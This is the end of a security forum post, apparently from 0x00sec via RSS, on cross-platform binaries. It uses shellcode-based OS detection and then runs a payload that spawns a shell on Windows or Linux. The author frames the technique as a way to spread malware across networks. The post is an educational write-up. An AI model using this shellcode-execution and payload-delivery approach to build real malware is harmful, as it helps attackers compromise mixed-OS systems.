<p>As we can see from the source code, we use the classical shellcode execution technique in order to invoke the shellcode that we crafted. Upon execution, we get the following output on the Windows host and Linux VM respectively.</p>
<pre><code class="lang-auto">C:\Users\crimsonRain\Desktop&gt;test.com
1
</code></pre>
<pre><code class="lang-auto">crimsonRain@Desktop:~/mal$./test.com
2
</code></pre>
<p>And yes, I almost forgot to mention the systems are both 64 bit, so this method of OS detection works. We can conclude that both high and low level methods of OS detection work properly but their use case will be discussed further.</p>
<h1>High Level vs Low Level?</h1>
<ol>
<li>Speed and Size - It’s always a given that Low Level is king in this domain since we take control of constructing assembly instructions rather than handing it off to a compiler. So if you really want these tweaks in performance, you’re better off using the Low Level method of OS detection.</li>
<li>Ease of Development - Using the High Level method is best if the programmer lacks the appropriate skill to write assembly or wants to save time and effort as crafting shellcode can be fairly frustrating.</li>
<li>Portability - You could say this is a consequence of point 2, where if we used the High Level approach, we would just need to add a function that expects another parameter for another given OS. This is not the case with the Low Level approach as we are required to look for assembly tricks that take advantage of the differences in the given environments of each OS.</li>
</ol>
<h1>Payload Time</h1>
<p>Now we have all the pieces in place and we can finally construct a binary that guarantees execution of payload on either a Windows or Linux system. The following is the final source code with an inclusion of payload:</p>
<pre><code class="lang-auto">int get_os() {
        unsigned char * exec = "\x31\xc0\x48\x75\x08\x8c"
                               "\xd8\x85\xc0\x75\x10\xeb"
                               "\x09\x8c\xe0\x85\xc0\x74"
                               "\x0d\x31\xc0\xc3\x31\xc0"
                               "\xb0\x01\xc3\x31\xc0\xb0"
                               "\x02\xc3\x31\xc0\xb0\x03"
                               "\xc3";
        int (*_get_os)() = (int(*)())exec;
        return _get_os();
}

int main() {
        int OS = get_os();
        if(OS == 1 || OS == 3)
        	system("/bin/bash");
    	else
            system("cmd.exe");
        return 0;
}
</code></pre>
<h1>Conclusion</h1>
<p>It was never thought that cross platform binaries would be a thing, but surprisingly enough, they are here. But through utilizing both an archaic technique of low level OS detection and the new technology of multi platform binaries, we are able to show that it is possible to achieve Multi Platform Execution of a given payload. This idea could be further extended to conditionally executing whole routines for a given OS or be able to make most devices in a network a victim of malware since we don’t need any third party libraries, no interpreter and no virtual machine.</p>
<p>Well, I hope you enjoyed reading this small post and feel free to point out any mistakes as I’m also learning. And finally, thank you <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> for writing out the Programming for Wanabes series which inspired me to write this post in order to share what I learnt.</p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/multi-platform-execution/25663">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/multi-platform-execution/25663</link>
          <pubDate>Wed, 14 Apr 2021 23:26:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25663</guid>
          <source url="https://0x00sec.org/t/multi-platform-execution/25663.rss">Multi Platform Execution</source>
        </item>
  </channel>
</rss>
